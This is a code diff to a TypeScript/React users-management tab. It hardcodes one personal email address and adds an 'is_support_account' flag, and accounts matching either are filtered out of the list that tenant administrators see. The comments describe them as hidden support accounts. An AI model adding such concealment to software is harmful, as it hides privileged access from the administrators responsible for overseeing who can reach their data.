@@ -52,6 +52,9 @@ import { logAuditEvent } from '@/features/users-permissions/components/AuditLogT
 
 // ─── Role Filtering (same as RolesManagementTab) ────────────
 const HIDDEN_ROLE_CODES = ['super_admin', 'support', 'support_senior', 'tenant_admin'];
+// ─── Hidden Support Accounts (never shown in user management) ───
+const SUPPORT_HIDDEN_EMAILS = ['feras1960@gmail.com'];
+const SUPPORT_HIDDEN_ROLES = ['super_admin'];
 const ROLE_LEVEL_FIX: Record<string, string> = {
     auditor: 'special',
     purchaser: 'operations',
@@ -161,7 +164,7 @@ export default function UsersManagementTab() {
             // Load users — filtered by company_ids (mandatory since tenant_id is dropped)
             let usersQuery = supabase
                 .from('user_profiles')
-                .select('id, email, full_name, avatar_url, company_id, branch_id, is_active, phone')
+                .select('id, email, full_name, avatar_url, company_id, branch_id, is_active, phone, is_support_account')
                 .order('full_name');
                 
             if (companyIds.length > 0) {
@@ -208,17 +211,20 @@ export default function UsersManagementTab() {
                 }
             });
 
-            // Transform data
-            const transformedUsers = (usersData || []).map((u: any) => ({
-                id: u.id,
-                email: u.email,
-                full_name: u.full_name,
-                avatar_url: u.avatar_url,
-                company_id: u.company_id,
-                branch_id: u.branch_id,
-                is_active: u.is_active !== false,
-                roles: userRolesMap.get(u.id) || [],
-            }));
+            // Transform data & filter out hidden support accounts
+            const transformedUsers = (usersData || [])
+                .filter((u: any) => !SUPPORT_HIDDEN_EMAILS.includes(u.email?.toLowerCase()))
+                .filter((u: any) => !u.is_support_account)
+                .map((u: any) => ({
+                    id: u.id,
+                    email: u.email,
+                    full_name: u.full_name,
+                    avatar_url: u.avatar_url,
+                    company_id: u.company_id,
+                    branch_id: u.branch_id,
+                    is_active: u.is_active !== false,
+                    roles: userRolesMap.get(u.id) || [],
+                }));
 
             setUsers(transformedUsers);
 
